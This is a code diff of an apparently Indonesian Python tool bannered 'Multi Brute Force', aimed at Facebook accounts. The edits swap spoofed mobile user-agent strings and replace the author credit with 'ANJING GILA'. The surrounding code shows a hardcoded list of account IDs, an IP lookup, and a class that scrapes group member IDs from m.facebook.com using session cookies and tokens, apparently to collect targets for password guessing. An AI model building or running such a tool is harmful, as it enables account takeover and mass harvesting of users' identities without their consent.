@@ -87,7 +87,7 @@ _my_account_ = [
     '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']
 
 ### User Agent
-ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; 2201116TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
 ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
@@ -119,7 +119,7 @@ def clear():
 def banner():
     _logo_line_1_ = ('%s   _______ __         ___'%(O))
     _logo_line_2_ = ('%s  / __/ (_) /____ %s©  %s<  /  ╔═══════════════════════╗'%(O,P,O))
-    _logo_line_3_ = ('%s / _// / / __/ -_)   / /   ║  %sCoded By Dapunta AR  %s║'%(O,P,O))
+    _logo_line_3_ = ('%s / _// / / __/ -_)   / /   ║  %sCoded By ANJING GILA  %s║'%(O,P,O))
     _logo_line_4_ = ('%s/___/_/_/\__/\__/  _/ /_   ║    %s• XNSCODETEAM •    %s║'%(O,P,O))
     _logo_line_5_ = ('%sMulti Brute Force %s/____/   ╚═══════════════════════╝'%(P,O))
     _dapunta_cici_(_logo_line_1_)
@@ -252,7 +252,7 @@ def menu():
         jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
         bersih()
         menu_log()
-    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]
+    try:a = _req_get_("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 11; 2201116TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json();ip = a["query"]
     except KeyError:ip = " "
     _update_ = 'V1.6'
     _dapunta_cici_('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))
@@ -469,7 +469,7 @@ def scrape_komen(_dapunta_,_url_,_file_):
 ### Dump ID From Group
 class dump_grup:
     def __init__(self,_dapunta_,_cici_):
-        self.glist=[];self._grup_=[];self.id='__dapunta__.json';self.token=_cici_;self.cookies=_dapunta_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"};self.main_group("https://m.facebook.com/groups/?seemore")
+        self.glist=[];self._grup_=[];self.id='__dapunta__.json';self.token=_cici_;self.cookies=_dapunta_;self.header = {"user-agent": "Mozilla/5.0 (Linux; Android 11; 2201116TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"};self.main_group("https://m.facebook.com/groups/?seemore")
     def main_group(self, url_dev):
         bs=bs4.BeautifulSoup(_req_get_(url_dev,cookies=self.cookies,headers=self.header).text,"html.parser")
         for _cici_ in bs.find_all("a",href=True):
